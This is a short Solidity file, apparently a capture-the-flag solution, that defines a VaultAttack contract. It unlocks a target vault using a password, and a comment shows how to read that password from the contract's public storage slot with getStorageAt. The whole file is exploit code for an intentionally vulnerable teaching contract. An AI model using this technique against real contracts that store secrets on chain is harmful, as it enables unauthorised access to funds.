// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IVault.sol";

contract VaultAttack {
    /**
     * @dev To get password from storage, you can run this script in client side:
     * > await web3.eth.getStorageAt(contract.address, 1)
     */
    function attack(IVault target, bytes32 password) external {
        target.unlock(password);

        require(!target.locked(), "Vault: Attack failed");
    }
}
